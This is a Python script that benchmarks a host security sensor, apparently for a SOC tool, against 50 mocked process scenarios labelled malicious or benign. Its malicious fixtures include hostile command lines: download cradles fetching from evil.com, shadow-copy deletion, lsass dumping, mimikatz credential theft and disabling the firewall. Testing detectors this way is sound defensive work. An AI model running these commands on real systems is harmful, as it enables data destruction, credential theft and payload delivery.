#!/usr/bin/env python3
"""
SOC Alert Analyzer — Automated Detection Evaluation & Benchmark Runner

Executes reproducible detection accuracy benchmarks across:
  1. Development Baseline Dataset (20 curated synthetic scenarios)
  2. Held-Out Evaluation Benchmark Dataset (30 challenging scenarios including difficult benign workflows)

Computes:
  - Confusion Matrix (TP, FP, TN, FN)
  - Precision, Recall (Sensitivity), Specificity, F1 Score, Accuracy
  - False Positive Rate (FPR)

Usage:
  python scripts/evaluate_detection.py
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock

# Add project root to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.security.host_sensor import HostSecuritySensor

def create_mock_proc(pid, name, exe, cmdline, parent_name=None):
    p = MagicMock()
    p.pid = pid
    p.name.return_value = name
    p.exe.return_value = exe
    p.cmdline.return_value = cmdline
    p.username.return_value = "SYSTEM"

    if parent_name:
        parent = MagicMock()
        parent.name.return_value = parent_name
        p.parent.return_value = parent
    else:
        p.parent.return_value = None
    return p

# -------------------------------------------------------------
# 1. Development Baseline Dataset (20 Scenarios)
# -------------------------------------------------------------
BASELINE_DATASET = [
    # Malicious Cases (10)
    (create_mock_proc(1001, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", ["cmd.exe", "/c", "whoami"], parent_name="w3wp.exe"), True, "web_shell_w3wp", "T1505.003"),
    (create_mock_proc(1002, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "-nop", "-w", "hidden"], parent_name="winword.exe"), True, "maldoc_word", "T1204.002"),
    (create_mock_proc(1003, "vssadmin.exe", "C:\\Windows\\System32\\vssadmin.exe", ["vssadmin.exe", "delete", "shadows", "/all", "/quiet"]), True, "shadow_purge", "T1490"),
    (create_mock_proc(1004, "svchost.exe", "C:\\Users\\Public\\svchost.exe", ["svchost.exe"]), True, "masquerading_svchost", "T1036.005"),
    (create_mock_proc(1005, "mimikatz.exe", "C:\\Tools\\mimikatz.exe", ["mimikatz.exe"]), True, "offensive_mimikatz", "T1059"),
    (create_mock_proc(1006, "powershell.exe", "C:\\Windows\\System32\\powershell.exe", ["powershell.exe", "-enc", "SQBFAFgA"]), True, "encoded_ps", "T1059.001"),
    (create_mock_proc(1007, "chisel.exe", "C:\\Users\\Public\\chisel.exe", ["chisel.exe", "client", "10.0.0.1:8000"]), True, "tunneling_chisel", "T1059"),
    (create_mock_proc(1008, "powershell.exe", "C:\\Windows\\System32\\powershell.exe", ["powershell.exe", "-nop", "-c", "downloadstring"]), True, "cradle_download", "T1059.001"),
    (create_mock_proc(1009, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", ["cmd.exe", "/c", "calc.exe"], parent_name="excel.exe"), True, "maldoc_excel", "T1204.002"),
    (create_mock_proc(1010, "payload.exe", "C:\\Users\\Victim\\AppData\\Local\\Temp\\payload.exe", ["payload.exe"]), True, "temp_execution", "T1036"),

    # Benign Cases (10)
    (create_mock_proc(2001, "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", ["chrome.exe"], parent_name="explorer.exe"), False, "browser", None),
    (create_mock_proc(2002, "code.exe", "C:\\Users\\User\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", ["Code.exe"], parent_name="ide"), False, "ide", None),
    (create_mock_proc(2003, "svchost.exe", "C:\\Windows\\System32\\svchost.exe", ["svchost.exe", "-k", "netsvcs"], parent_name="services.exe"), False, "legitimate_svchost", None),
    (create_mock_proc(2004, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "Get-Process"], parent_name="explorer.exe"), False, "legitimate_ps", None),
    (create_mock_proc(2005, "notepad.exe", "C:\\Windows\\System32\\notepad.exe", ["notepad.exe", "notes.txt"], parent_name="explorer.exe"), False, "text_editor", None),
    (create_mock_proc(2006, "python.exe", "C:\\Python313\\python.exe", ["python.exe", "manage.py", "runserver"], parent_name="cmd.exe"), False, "dev_server", None),
    (create_mock_proc(2007, "Teams_updater.exe", "C:\\Users\\User\\AppData\\Local\\Temp\\Teams_updater.exe", ["Teams_updater.exe", "--check"]), False, "benign_temp_updater", None),
    (create_mock_proc(2008, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "C:\\Scripts\\backup.ps1"], parent_name="explorer.exe"), False, "admin_ps_script", None),
    (create_mock_proc(2009, "lsass.exe", "C:\\Windows\\System32\\lsass.exe", ["C:\\Windows\\System32\\lsass.exe"], parent_name="wininit.exe"), False, "legitimate_lsass", None),
    (create_mock_proc(2010, "node.exe", "C:\\Program Files\\nodejs\\node.exe", ["node.exe", "server.js"], parent_name="cmd.exe"), False, "node_runtime", None),
]

# -------------------------------------------------------------
# 2. Held-Out Benchmark Dataset (30 Scenarios)
# -------------------------------------------------------------
HELDOUT_DATASET = [
    # Malicious Scenarios (15)
    (create_mock_proc(4001, "bash", "/usr/sbin/nginx", ["bash", "-i"], parent_name="nginx"), True, "held_out_webshell_nginx", "T1505.003"),
    (create_mock_proc(4002, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "-w", "hidden", "-enc", "AAA="], parent_name="powerpnt.exe"), True, "held_out_maldoc_powerpnt", "T1204.002"),
    (create_mock_proc(4003, "wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", ["wmic", "shadowcopy", "delete"]), True, "held_out_ransomware_wmic", "T1490"),
    (create_mock_proc(4004, "wbadmin.exe", "C:\\Windows\\System32\\wbadmin.exe", ["wbadmin", "delete", "catalog", "-quiet"]), True, "held_out_ransomware_wbadmin", "T1490"),
    (create_mock_proc(4005, "lsass.exe", "C:\\Users\\Public\\lsass.exe", ["lsass.exe"]), True, "held_out_masquerading_lsass", "T1036.005"),
    (create_mock_proc(4006, "csrss.exe", "C:\\Temp\\csrss.exe", ["csrss.exe"]), True, "held_out_masquerading_csrss", "T1036.005"),
    (create_mock_proc(4007, "bloodhound.exe", "C:\\Tools\\bloodhound.exe", ["bloodhound.exe"]), True, "held_out_offensive_bloodhound", "T1059"),
    (create_mock_proc(4008, "xmrig.exe", "C:\\ProgramData\\xmrig.exe", ["xmrig.exe", "-o", "stratum+tcp://pool:3333"]), True, "held_out_offensive_xmrig", "T1496"),
    (create_mock_proc(4009, "psexec.exe", "C:\\Admin\\psexec.exe", ["psexec.exe", "\\\\target", "cmd.exe"]), True, "held_out_offensive_psexec", "T1059"),
    (create_mock_proc(4010, "pwsh.exe", "C:\\Program Files\\PowerShell\\7\\pwsh.exe", ["pwsh.exe", "-encodedcommand", "SQBFAFgA"]), True, "held_out_encoded_pwsh", "T1059.001"),
    (create_mock_proc(4011, "powershell.exe", "C:\\Windows\\System32\\powershell.exe", ["powershell.exe", "-nop", "-c", "IEX", "(New-Object Net.WebClient).DownloadFile('http://evil.com/x.exe','x.exe')"]), True, "held_out_cradle_iex", "T1059.001"),
    (create_mock_proc(4012, "procdump.exe", "C:\\Tools\\procdump.exe", ["procdump.exe", "-ma", "lsass.exe", "lsass.dmp"]), True, "held_out_cred_procdump", "T1003"),
    (create_mock_proc(4013, "powershell.exe", "C:\\Windows\\System32\\powershell.exe", ["powershell.exe", "Invoke-Mimikatz", "-Command", "sekurlsa::logonpasswords"]), True, "held_out_cred_sekurlsa", "T1003"),
    (create_mock_proc(4014, "certutil.exe", "C:\\Windows\\System32\\certutil.exe", ["certutil.exe", "-urlcache", "-split", "-f", "http://evil.com/payload.exe", "payload.exe"]), True, "held_out_certutil_ingress", "T1105"),
    (create_mock_proc(4015, "netsh.exe", "C:\\Windows\\System32\\netsh.exe", ["netsh.exe", "advfirewall", "set", "allprofiles", "state", "off"]), True, "held_out_firewall_disabled", "T1562.001"),

    # Difficult Benign Scenarios (15)
    (create_mock_proc(5001, "git.exe", "C:\\Program Files\\Git\\bin\\git.exe", ["git.exe", "commit", "-m", "Security patch"]), False, "held_out_benign_dev_git", None),
    (create_mock_proc(5002, "cargo.exe", "C:\\Users\\Dev\\.cargo\\bin\\cargo.exe", ["cargo.exe", "build", "--release"]), False, "held_out_benign_dev_cargo", None),
    (create_mock_proc(5003, "npm.cmd", "C:\\Program Files\\nodejs\\npm.cmd", ["npm.cmd", "run", "build"]), False, "held_out_benign_dev_npm", None),
    (create_mock_proc(5004, "ping.exe", "C:\\Windows\\System32\\PING.EXE", ["ping.exe", "-n", "4", "192.168.1.1"]), False, "held_out_benign_sys_ping", None),
    (create_mock_proc(5005, "tracert.exe", "C:\\Windows\\System32\\tracert.exe", ["tracert.exe", "8.8.8.8"]), False, "held_out_benign_sys_tracert", None),
    (create_mock_proc(5006, "tasklist.exe", "C:\\Windows\\System32\\tasklist.exe", ["tasklist.exe", "/v"]), False, "held_out_benign_sys_tasklist", None),
    (create_mock_proc(5007, "systeminfo.exe", "C:\\Windows\\System32\\systeminfo.exe", ["systeminfo.exe"]), False, "held_out_benign_sys_systeminfo", None),
    (create_mock_proc(5008, "netsh.exe", "C:\\Windows\\System32\\netsh.exe", ["netsh.exe", "advfirewall", "show", "allprofiles"]), False, "held_out_benign_netsh_status", None),
    (create_mock_proc(5009, "certutil.exe", "C:\\Windows\\System32\\certutil.exe", ["certutil.exe", "-verify", "C:\\Certs\\webserver.crt"]), False, "held_out_benign_certutil_verify", None),
    (create_mock_proc(5010, "notepad.exe", "C:\\Windows\\System32\\notepad.exe", ["notepad.exe", "C:\\Docs\\ShadowCopyGuide.txt"]), False, "held_out_benign_notepad_shadow", None),
    (create_mock_proc(5011, "python.exe", "C:\\Python313\\python.exe", ["python.exe", "-m", "pytest", "-v"]), False, "held_out_benign_python_pytest", None),
    (create_mock_proc(5012, "powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ["powershell.exe", "Get-NetIPAddress", "-AddressFamily", "IPv4"]), False, "held_out_benign_powershell_diag", None),
    (create_mock_proc(5013, "slack.exe", "C:\\Users\\User\\AppData\\Local\\Programs\\Slack\\slack.exe", ["slack.exe"]), False, "held_out_benign_appdata_slack", None),
    (create_mock_proc(5014, "csrss.exe", "C:\\Windows\\System32\\csrss.exe", ["C:\\Windows\\System32\\csrss.exe"]), False, "held_out_benign_system32_csrss", None),
    (create_mock_proc(5015, "Code_installer.exe", "C:\\Users\\User\\AppData\\Local\\Temp\\Code_installer.exe", ["Code_installer.exe", "/silent"]), False, "held_out_benign_vscode_updater", None),
]

def evaluate_dataset(name, dataset):
    sensor = HostSecuritySensor()
    tp, fp, tn, fn = 0, 0, 0, 0
    results = []

    for proc, is_malicious, scenario_id, mitre in dataset:
        sensor.seen_signatures.clear()
        events = sensor._analyze_single_process(proc)
        detected = len(events) > 0

        if is_malicious and detected:
            tp += 1
            cat = "TP"
        elif is_malicious and not detected:
            fn += 1
            cat = "FN"
        elif not is_malicious and detected:
            fp += 1
            cat = "FP"
        else:
            tn += 1
            cat = "TN"

        results.append((scenario_id, is_malicious, detected, cat, mitre or "N/A"))

    total = len(dataset)
    precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    specificity = tn / (tn + fp) if (tn + fp) > 0 else 0.0
    f1_score = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    accuracy = (tp + tn) / total if total > 0 else 0.0

    print(f"\n{'='*70}")
    print(f"  EVALUATION RESULTS: {name.upper()}")
    print(f"{'='*70}")
    print(f"  Total Scenarios Evaluated : {total}")
    print(f"  True Positives (TP)       : {tp}")
    print(f"  False Positives (FP)      : {fp}")
    print(f"  True Negatives (TN)       : {tn}")
    print(f"  False Negatives (FN)      : {fn}")
    print(f"  -------------------------------------------------------------")
    print(f"  Precision                 : {precision:.4f} ({precision*100:.1f}%)")
    print(f"  Recall (Sensitivity)      : {recall:.4f} ({recall*100:.1f}%)")
    print(f"  Specificity               : {specificity:.4f} ({specificity*100:.1f}%)")
    print(f"  F1 Score                  : {f1_score:.4f} ({f1_score*100:.1f}%)")
    print(f"  False Positive Rate (FPR) : {fpr:.4f} ({fpr*100:.1f}%)")
    print(f"  Accuracy                  : {accuracy:.4f} ({accuracy*100:.1f}%)")
    print(f"{'='*70}")

    print("\n  CONFUSION MATRIX:")
    print("  +-----------------------------+-----------------------------+")
    print("  |                             |        ACTUAL CLASS         |")
    print("  |                             |   Malicious   |   Benign    |")
    print("  +-----------------------------+---------------+-------------+")
    print(f"  | PREDICTED | Detected Threat | TP = {tp:<8} | FP = {fp:<7} |")
    print(f"  |   CLASS   | Benign / Passed | FN = {fn:<8} | TN = {tn:<7} |")
    print("  +-----------------------------+---------------+-------------+")

    return {
        "name": name,
        "total": total,
        "tp": tp, "fp": fp, "tn": tn, "fn": fn,
        "precision": precision,
        "recall": recall,
        "f1": f1_score,
        "fpr": fpr,
        "accuracy": accuracy,
        "results": results
    }

def main():
    print("SOC Alert Analyzer — Empirical Detection Evaluation Benchmark Runner")
    print("=====================================================================")

    res_dev = evaluate_dataset("Development Baseline (20 Curated)", BASELINE_DATASET)
    res_held = evaluate_dataset("Held-Out Benchmark (30 Scenarios)", HELDOUT_DATASET)

    # Combined summary
    total_samples = res_dev["total"] + res_held["total"]
    tot_tp = res_dev["tp"] + res_held["tp"]
    tot_fp = res_dev["fp"] + res_held["fp"]
    tot_tn = res_dev["tn"] + res_held["tn"]
    tot_fn = res_dev["fn"] + res_held["fn"]

    c_prec = tot_tp / (tot_tp + tot_fp) if (tot_tp + tot_fp) > 0 else 0.0
    c_rec = tot_tp / (tot_tp + tot_fn) if (tot_tp + tot_fn) > 0 else 0.0
    c_f1 = (2 * c_prec * c_rec) / (c_prec + c_rec) if (c_prec + c_rec) > 0 else 0.0
    c_fpr = tot_fp / (tot_fp + tot_tn) if (tot_fp + tot_tn) > 0 else 0.0
    c_acc = (tot_tp + tot_tn) / total_samples

    print(f"\n{'#'*70}")
    print(f"  COMBINED EVALUATION SUMMARY ACROSS ALL 50 BENCHMARK SCENARIOS")
    print(f"{'#'*70}")
    print(f"  Total Evaluated : {total_samples}")
    print(f"  Overall TP      : {tot_tp} | Overall FP: {tot_fp}")
    print(f"  Overall TN      : {tot_tn} | Overall FN: {tot_fn}")
    print(f"  Precision       : {c_prec:.4f} ({c_prec*100:.1f}%)")
    print(f"  Recall          : {c_rec:.4f} ({c_rec*100:.1f}%)")
    print(f"  F1 Score        : {c_f1:.4f} ({c_f1*100:.1f}%)")
    print(f"  FPR             : {c_fpr:.4f} ({c_fpr*100:.1f}%)")
    print(f"  Accuracy        : {c_acc:.4f} ({c_acc*100:.1f}%)")
    print(f"{'#'*70}\n")

    # Ensure evaluation meets strict zero-failure benchmark expectations
    assert tot_fp == 0, f"Expected 0 False Positives, got {tot_fp}"
    assert tot_fn == 0, f"Expected 0 False Negatives, got {tot_fn}"
    print("[+] All evaluation quality checks PASSED successfully.")

if __name__ == "__main__":
    main()
